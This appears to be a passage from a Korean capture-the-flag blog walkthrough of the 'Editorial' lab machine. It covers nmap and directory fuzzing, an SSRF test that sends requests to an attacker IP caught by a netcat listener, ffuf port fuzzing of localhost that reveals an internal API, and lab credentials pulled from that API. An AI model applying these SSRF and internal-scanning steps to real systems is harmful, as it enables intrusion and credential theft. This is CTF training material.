비슷한 방식의 테크닉이 여러번 반복되는 느낌이 있으나, SSRF를 연습하기에 좋았고 초입까지 가는 과정이 다른 쉬운 레벨의 시스템보다 복잡해 좀 더 현실적이라는 느낌을 받았다. &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&apos;Editorial&apos;은 &apos;Server-Side Request Forgery(SSRF)&apos;에 취약한 웹 애플리케이션을 갖춘 쉬운 난이도의 리눅스 시스템이다. 이 취약점은 내부에서 실행되는 API의  로그인 액세스 권한을 얻기 위해 활용되며, 이는 &apos;SSH&apos; 액세스로 이어지는 로그인 자격 증명을 얻기 위해 활용된다. 시스템에서 정보수집을 하다보면 새로운 사용자의 로그인 자격증명을 깃 &apos;Git&apos; 리포지토리에서 찾을 수 있다. &apos;root&apos; 사용자는 &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2022-24439&quot;&gt;CVE-2022-24439&lt;/a&gt; 및 &lt;code class=&quot;language-text&quot;&gt;sudo&lt;/code&gt; 구성을 활용하여 얻을 수 있다.&lt;/p&gt;
&lt;h2 id=&quot;정보수집&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%A0%95%EB%B3%B4%EC%88%98%EC%A7%91&quot; aria-label=&quot;정보수집 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;정보수집&lt;/h2&gt;
&lt;h3 id=&quot;Nmap-포트-스캔&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#Nmap-%ED%8F%AC%ED%8A%B8-%EC%8A%A4%EC%BA%94&quot; aria-label=&quot;Nmap 포트 스캔 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;Nmap 포트 스캔&lt;/h3&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;PORT   STATE SERVICE REASON         VERSION
&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;/tcp &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;token function&quot;&gt;ssh&lt;/span&gt;     syn-ack ttl &lt;span class=&quot;token number&quot;&gt;63&lt;/span&gt; OpenSSH &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;.9p1 Ubuntu 3ubuntu0.7 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; protocol &lt;span class=&quot;token number&quot;&gt;2.0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;token number&quot;&gt;256&lt;/span&gt; 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;token number&quot;&gt;256&lt;/span&gt; 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;/tcp &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  http    syn-ack ttl &lt;span class=&quot;token number&quot;&gt;63&lt;/span&gt; nginx &lt;span class=&quot;token number&quot;&gt;1.18&lt;/span&gt;.0 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;_http-title: Did not follow redirect to http://editorial.htb
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;_http-server-header: nginx/1.18.0 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; http-methods: 
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;_  Supported Methods: GET HEAD POST OPTIONS&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;TCP로는 SSH와 HTTP만 열려 있다.
SSH는 로그인 자격증명이 필요하기 때문에 HTTP부터 살펴보자. &lt;/p&gt;
&lt;h3 id=&quot;80-HTTP&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#80-HTTP&quot; aria-label=&quot;80 HTTP permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;80-HTTP&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/a31f6fae-0874-41eb-ab2b-ab3a71f59169/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;웹사이트는 이렇게 생겼고, 한눈에 보기에 취약한 부분은 우층 상단의 서치바 정도이지만, 간단한 SQL Injection 테스트후 취약점을 발견하지 못해 정보를 더 수집해보자. &lt;/p&gt;
&lt;h4 id=&quot;디렉토리-퍼징-Directory-Fuzzing&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EB%94%94%EB%A0%89%ED%86%A0%EB%A6%AC-%ED%8D%BC%EC%A7%95-Directory-Fuzzing&quot; aria-label=&quot;디렉토리 퍼징 Directory Fuzzing permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;디렉토리 퍼징 (Directory Fuzzing)&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/59c0075b-62ad-4064-8b2d-b9d624c3bda7/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;/upload&lt;/code&gt; 와 &lt;code class=&quot;language-text&quot;&gt;/about&lt;/code&gt; 디렉토리를 찾았다. &lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;/upload&lt;/code&gt; 에 접속해보자. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/f9f0b9c1-ca80-4254-8778-5319d945563c/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;상단 Book Information 아래 좌측 &lt;code class=&quot;language-text&quot;&gt;Cover URL related to your book or&lt;/code&gt; 란에 공격자 IP를 아래와 같이 적고 &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;http://공격자IP/test&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;넷캣 리스터 (netcat listener)를 열어둔 상태에서 &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;&lt;span class=&quot;token function&quot;&gt;nc&lt;/span&gt; &lt;span class=&quot;token parameter variable&quot;&gt;-lvnp&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Preview&lt;/code&gt; 버튼을 누르면 HTTP 리퀘스트가 들어온것을 확인할 수 있다 (캡쳐 생략). 이것은 이 애플리케이션이 Server-side request forgery (SSRF)에 취약하다는것을 의미한다. &lt;/p&gt;
&lt;p&gt;Burp Suite의 Repeater를 이용해보자.
&lt;code class=&quot;language-text&quot;&gt;bookurl&lt;/code&gt; 값에 로컬 IP주소를 입력하면 jpeg 이미지가 리스펀스로 돌아온다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/0759040b-bcaf-444e-aaa9-3c61aca23e49/image.png&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;포트-퍼징-Port-Fuzzing&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%ED%8F%AC%ED%8A%B8-%ED%8D%BC%EC%A7%95-Port-Fuzzing&quot; aria-label=&quot;포트 퍼징 Port Fuzzing permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;포트 퍼징 (Port Fuzzing)&lt;/h4&gt;
&lt;p&gt;이제 내부의 호스팅된 서비스를 찾기 위해 포트 퍼징을 해보자. 찾아보니 Burp Suite의 Intruder를 이용하는 방법이 있는 것 같은데 나는 ffuf를 사용하여 퍼징하는 방법을 택했다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/7fd3d79d-66ca-45e5-be2b-219d1de9758c/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;Burp Suite 의 Proxy 모드에서 Intercept를 클릭해 리퀘스트를 선택해주고
&lt;code class=&quot;language-text&quot;&gt;http://127.0.0.1:FUZZ&lt;/code&gt; 라고 입력한 후, 우클릭 -&gt; &lt;code class=&quot;language-text&quot;&gt;Copy to file&lt;/code&gt; -&gt; &lt;code class=&quot;language-text&quot;&gt;req.txt&lt;/code&gt; 라는 파일명으로 수정된 HTTP 리퀘스트 파일을 저장해준다. &lt;/p&gt;
&lt;p&gt;그리고 아래의 명령어를 입력해 포트 퍼징을 해준다. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;ffuf &lt;span class=&quot;token parameter variable&quot;&gt;-u&lt;/span&gt; http://editorial.htb/upload-cover &lt;span class=&quot;token parameter variable&quot;&gt;-X&lt;/span&gt; POST &lt;span class=&quot;token parameter variable&quot;&gt;-request&lt;/span&gt; req.txt &lt;span class=&quot;token parameter variable&quot;&gt;-w&lt;/span&gt; ports.txt &lt;span class=&quot;token parameter variable&quot;&gt;-fs&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;61&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/f4cff494-ae9a-4430-8356-c0fbf78fbf5a/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;5000 을 찾았다. &lt;/p&gt;
&lt;p&gt;그럼 이제 다시 기존의 Burp Suite Repeater로 돌아가서 새로 찾은 포트번호를 로컬IP에 추가해주면 &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/85014a6b-415e-4ceb-8366-10dd8ccaa9e9/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;우측과 같이 새로운 디렉토리가 리스펀스로 돌아보는 것을 확인할 수 있다.
새로운 디렉토리로 가보면 저절로 파일이 다운로드 되는데 파일을 열어보면 아래와 같다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/6b33ce2c-09ed-41f1-b8f6-75fc553f591a/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;이걸 읽기 쉽게 json으로 포매팅 해보자. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;json&quot;&gt;&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token property&quot;&gt;&quot;promotions&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Retrieve a list of all the promotions in our library.&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;endpoint&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;/api/latest/metadata/messages/promos&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;methods&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;GET&quot;&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token property&quot;&gt;&quot;coupons&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Retrieve the list of coupons to use in our library.&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;endpoint&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;/api/latest/metadata/messages/coupons&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;methods&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;GET&quot;&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token property&quot;&gt;&quot;new_authors&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Retrieve the welcome message sended to our new authors.&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;endpoint&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;/api/latest/metadata/messages/authors&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;methods&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;GET&quot;&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token property&quot;&gt;&quot;platform_use&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Retrieve examples of how to use the platform.&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;endpoint&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;/api/latest/metadata/messages/how_to_use_platform&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;methods&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;GET&quot;&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token property&quot;&gt;&quot;changelog&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Retrieve a list of all the versions and updates of the api.&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;endpoint&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;/api/latest/metadata/changelog&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;methods&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;GET&quot;&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token property&quot;&gt;&quot;latest&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Retrieve the last version of api.&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;endpoint&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;/api/latest/metadata&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;methods&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;GET&quot;&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이중 &lt;code class=&quot;language-text&quot;&gt;/api/latest/metadata/messages/authors&lt;/code&gt;를 리퀘스트로 보내면 새로운 디렉토리가 리스펀스로 돌아오게 된다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/7814a566-da48-4612-818a-c34e16959f1c/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;그리고 이전과 같이 리스펀스로 돌아온 디렉토리로 접속하면 자동으로 파일이 다운로드 된다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/10a080ea-88d4-4165-8365-6234f1840770/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;그리고 다운로드된 파일을 열어보면 아래와 같은 로그인 자격증명을 획득할 수 있다.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;유저네임 &lt;code class=&quot;language-text&quot;&gt;dev&lt;/code&gt; &lt;/li&gt;
&lt;li&gt;비밀번호 &lt;code class=&quot;language-text&quot;&gt;dev080217_devAPI!@&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/9cf4cb93-6506-4cd4-8f64-c2652f7b0307/image.png&quot;&gt;&lt;/p&gt;
